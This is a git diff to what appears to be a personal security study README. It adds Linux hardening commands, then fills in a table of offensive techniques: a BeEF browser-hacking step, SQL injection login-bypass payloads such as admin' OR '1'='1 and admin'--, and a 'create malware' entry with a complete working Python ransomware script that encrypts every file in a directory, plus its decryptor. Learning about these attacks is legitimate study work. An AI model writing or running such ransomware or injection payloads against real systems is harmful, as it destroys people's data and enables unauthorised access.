@@ -42,10 +42,13 @@ enabled = true
     $ less /home/username/.bash_history
     $ iftop -i wlan0 ( $ip a )
     $ btop
+    $ lsof 
+    $ apt install chkrootkit (rootkit analyzer)
+    $ chkrootkit
 ```
 ### Defend Your Ubuntu System Against Network Attacks :
 
-Goal is to minimize the number of attack surface. ref - [blog](https://null-byte.wonderhowto.com/how-to/locking-down-linux-using-ubuntu-as-your-primary-os-part-2-network-attack-defense-0185709/)
+Goal is to minimize the number of attack surface with ref - [blog](https://null-byte.wonderhowto.com/how-to/locking-down-linux-using-ubuntu-as-your-primary-os-part-2-network-attack-defense-0185709/)
 
 ```
 $ sudo systemctl disable cups-browsed (cut down port listening)
@@ -582,24 +585,92 @@ $ sudo service nginx restart <br />
 
 <tr>
 <th>Hack Web Browser</th>
-<td>d<br /></td>
+<td>Hacking Web Browser with BeEF<br /></td>
 <td>
-
+$ cat /root/beef.info (copy beef server address and open in browser) <br />
 <br /></td>
 </tr>
 
 <tr>
 <th>SQL Injections</th>
-<td>d<br /></td>
+<td>run database against logins<br /></td>
 <td>
-
+SELECT * FROM users WHERE username = 'admin' AND password='pass' <br />
+<br />
+use admin' as username, so username = ' admin' ', if syntax error = SQL Inj vuln <br />
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password='pass' ( first reads AND then OR ) <br /><br />
+username : admin' OR '1'='1 ; password: password123 <br />
+<br />
+username  :  admin'-- <br />
+SELECT * FROM users WHERE username ='admin'-- 'AND password='password123' <br />
+-- is comment and ignore the rest section after it in SQL injection attacks. <br />
 <br /></td>
 </tr>
 
 <tr>
 <th>create malware</th>
-<td>d<br /></td>
+<td>ransomware, worms, trojan, adware, spyware<br /></td>
 <td>
+$ mkdir ransomware <br />
+$ cd ransomware (encrypt the following files)<br />
+$ echo "this is a file" > file.txt <br />
+$ echo "leave me alone" > file2.txt <br />
+$ echo "another one" > hey.txt <br />
+$ echo "one more" > pleasedonthurtme.txt <br />
+$ nano ransom.py <br />
+<br />
+
+encryption script:<br />
+```python
+    #!/usr/bin/env python3
+    import os
+    from cryptography.fernet import Fernet
+
+
+    files = []
+
+    for file in os.listdir():
+        if file == "ransom.py" or file=="thekey.key" or file=="decrypt.py":
+            continue
+        if os.path.isfile(file):    
+            files.append(file) 
+
+    print(files)
+
+    key = Fernet.generate_key()
+
+    with open("thekey.key", "wb") as thekey:
+        thekey.write(key)
+
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_encrypted)
+
+    print(key)
+
+```
+decryption script:
+
+```python
+.
+.
+.
+print(files)
+
+with open("thekey.key", "rb") as key:
+    secretkey = key.read()
+
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    contents_decrypted = Fernet(secretkey).decrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_decrypted)
+
+```
 
 <br /></td>
 </tr>
